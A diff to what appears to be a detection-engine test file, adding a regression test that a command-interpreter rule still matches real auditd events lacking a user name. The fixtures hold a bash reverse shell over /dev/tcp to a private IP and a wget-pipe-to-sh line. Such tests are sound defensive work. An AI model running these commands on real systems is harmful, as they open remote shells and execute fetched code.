@@ -120,3 +120,33 @@ def test_curl_pipe_bash_still_matches_after_dev_tcp_addition():
     disturb the original curl/wget/nc matching path."""
     c = _t1059(YAMLDetectionEngine(), _shell_event("wget http://x/p | sh", name="sh"))
     assert c is not None and c.matched is True
+
+
+# ---------------------------------------------------------------------------
+# Regression: real auditd-sourced events never carry user.name
+# ---------------------------------------------------------------------------
+
+def test_matches_real_auditd_event_with_no_user_name(engine):
+    """AuditdParser never populates user.name from auid — only user.id — and
+    the Go agent never sends a top-level `username` field, so genuine
+    auditd-sourced events NEVER have user.name. This rule listed user.name in
+    required_fields since it was written, but the field was silently
+    unenforced until the required-fields skip gate landed on 2026-05-04
+    (yaml_detection_engine.py). From that point on this rule silently
+    stopped matching any real production event — it only ever "passed" in
+    fixtures and hand-built debug scripts that supplied user.name manually.
+    This event shape mirrors the real prod2 EXECVE record (process + host
+    only, no user key at all) that reproduced the live miss."""
+    event = {
+        "process": {
+            "name": "bash",
+            "command_line": "/bin/bash -c bash -i >& /dev/tcp/192.168.88.157/4444 0>&1",
+            "parent": {"pid": 1},
+        },
+        "host": {"name": "prod2"},
+    }
+    candidates = engine.evaluate_event(event, return_unmatched=True)
+    c = next((x for x in candidates if x.rule_id == RULE_ID), None)
+    assert c is not None, "Expected a candidate even without user.name present"
+    assert c.matched is True
+    assert "user.name" not in (c.missing_fields or [])
